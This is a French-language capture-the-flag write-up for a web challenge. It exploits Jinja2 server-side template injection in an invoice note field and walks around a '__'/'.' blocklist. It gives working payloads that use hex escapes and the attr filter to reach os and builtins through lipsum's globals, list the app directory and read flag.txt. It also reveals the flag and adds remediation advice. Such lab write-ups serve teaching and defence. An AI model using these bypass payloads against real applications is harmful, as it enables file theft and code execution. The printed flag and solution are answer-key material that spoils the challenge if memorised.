# Writeup — generateur-factures

**Catégorie :** web · **Niveau :** intermédiaire
**Flag :** `FPS{ssti_jinja2_attr_bypass_sans_underscore_ni_point}`

## Analyse

Le champ `note` est concaténé **dans le gabarit** avant rendu :

```python
html = TEMPLATE % note          # la note devient du code de template
render_template_string(html, ...)
```

C'est une **SSTI** Jinja2 : `{{7*7}}` dans la note renvoie `49`.

Un filtre rejette les notes contenant `__` ou `.` :

```python
BLOCKLIST = ("__", ".")
```

## Contournement

- Pas de `__` littéral → on l'écrit `\x5f\x5f` dans les chaînes Jinja.
- Pas d'opérateur `.` → on remplace `obj.attr` par `obj|attr("attr")`.
- Le point du **nom de fichier** `flag.txt` → `flag\x2etxt`.

L'énoncé invite à explorer `/app` (répertoire de travail de l'application). Le
module de `lipsum` importe `os`, ce qui permet de lister le répertoire courant :

```
{{ lipsum|attr("\x5f\x5fglobals\x5f\x5f")|attr("get")("os")|attr("listdir")() }}
# ['__pycache__', 'flag.txt', 'app.py', 'requirements.txt']
```

Chaîne d'accès aux builtins puis lecture du fichier (`lipsum` est une
fonction, donc expose `__globals__`) :

```
{{ lipsum|attr("\x5f\x5fglobals\x5f\x5f")
         |attr("get")("\x5f\x5fbuiltins\x5f\x5f")
         |attr("get")("open")("flag\x2etxt")
         |attr("read")() }}
```

```
python3 solve.py http://localhost:1343
# FPS{ssti_jinja2_attr_bypass_sans_underscore_ni_point}
```

## Remédiation

- Ne jamais injecter d'entrée utilisateur dans la **source** d'un template.
  Passer la note comme **variable** (`render_template_string("{{ note }}",
  note=note)`), jamais la concaténer.
- Une blocklist de sous-chaînes ne remplace pas l'isolation : préférer un
  moteur sans exécution (sandbox) ou pas de template du tout pour du texte brut.

## Infra

`docker compose up -d --build` dans `defi/` (port hôte **1343**). Le flag est
dans `/app/flag.txt` (copié par le Dockerfile, non fourni aux joueurs).
